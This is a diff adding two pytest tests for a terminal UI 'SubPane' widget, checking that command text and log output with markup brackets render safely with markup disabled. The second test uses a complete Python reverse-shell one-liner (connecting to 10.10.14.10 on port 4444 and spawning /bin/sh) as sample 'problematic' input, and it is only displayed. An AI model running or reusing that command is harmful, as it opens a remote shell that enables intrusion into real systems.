@@ -120,3 +120,94 @@ class TestSubPane:
             # Set to inactive
             pane.set_active(False)
             assert "active-pane" not in pane.classes
+    
+    @pytest.mark.asyncio
+    async def test_sub_pane_with_markup_characters(self):
+        """Test that a SubPane can handle commands with markup characters."""
+        # Create a temporary file for stdout with markup characters
+        with tempfile.NamedTemporaryFile(mode="w+", delete=False) as stdout_file:
+            stdout_file.write("Output with [bold]markup[/bold] characters\n")
+            stdout_file.write("Another line with [red]colored[/red] text\n")
+            stdout_path = stdout_file.name
+        
+        # Create a temporary file for stderr with markup characters
+        with tempfile.NamedTemporaryFile(mode="w+", delete=False) as stderr_file:
+            stderr_file.write("Error with [italic]markup[/italic] characters\n")
+            stderr_file.write("Another error with [blue]colored[/blue] text\n")
+            stderr_path = stderr_file.name
+        
+        try:
+            # Create a test command result with markup characters
+            log_files = LogFiles(stdout=stdout_path, stderr=stderr_path)
+            cmd_result = CommandResult.create(1, "echo '[bold]Hello[/bold]'", log_files)
+            
+            app = SubPaneTestApp()
+            async with app.run_test():
+                pane = app.query_one(SubPane)
+                
+                # Update with the test command result
+                pane.update_command_output(cmd_result)
+                
+                # Check that the content widget has markup disabled
+                content = app.query_one("#sub-pane-content")
+                assert content is not None
+                assert content.markup is False
+                
+                # Check that the command with markup characters is displayed correctly
+                rendered_text = content.renderable
+                assert "echo '[bold]Hello[/bold]'" in rendered_text or "echo '【bold】Hello【/bold】'" in rendered_text
+                
+                # Check that stdout with markup characters is displayed correctly
+                assert "Output with [bold]markup[/bold] characters" in rendered_text or "Output with 【bold】markup【/bold】 characters" in rendered_text
+                assert "Another line with [red]colored[/red] text" in rendered_text or "Another line with 【red】colored【/red】 text" in rendered_text
+                
+                # Check that stderr with markup characters is displayed correctly
+                assert "Error with [italic]markup[/italic] characters" in rendered_text or "Error with 【italic】markup【/italic】 characters" in rendered_text
+                assert "Another error with [blue]colored[/blue] text" in rendered_text or "Another error with 【blue】colored【/blue】 text" in rendered_text
+        finally:
+            # Clean up temporary files
+            os.unlink(stdout_path)
+            os.unlink(stderr_path)
+    
+    @pytest.mark.asyncio
+    async def test_sub_pane_with_problematic_command(self):
+        """Test that a SubPane can handle problematic commands."""
+        # Create empty temporary files for stdout and stderr
+        with tempfile.NamedTemporaryFile(mode="w+", delete=False) as stdout_file:
+            stdout_path = stdout_file.name
+        
+        with tempfile.NamedTemporaryFile(mode="w+", delete=False) as stderr_file:
+            stderr_path = stderr_file.name
+        
+        try:
+            # Create a test command result with problematic characters
+            problematic_cmd = "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.10\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);'"
+            log_files = LogFiles(stdout=stdout_path, stderr=stderr_path)
+            cmd_result = CommandResult.create(1, problematic_cmd, log_files)
+            
+            app = SubPaneTestApp()
+            async with app.run_test():
+                pane = app.query_one(SubPane)
+                
+                # Update with the test command result
+                pane.update_command_output(cmd_result)
+                
+                # Check that the content widget has markup disabled
+                content = app.query_one("#sub-pane-content")
+                assert content is not None
+                assert content.markup is False
+                
+                # The command should be displayed without causing errors
+                # We don't check the exact text because the character replacement might vary,
+                # but we ensure that the command is displayed in some form
+                rendered_text = content.renderable
+                assert "Command:" in rendered_text
+                assert "python3 -c" in rendered_text
+                
+                # Check that stdout and stderr sections are displayed
+                assert "Standard Output:" in rendered_text
+                assert "Standard Error:" in rendered_text
+        finally:
+            # Clean up temporary files
+            os.unlink(stdout_path)
+            os.unlink(stderr_path)
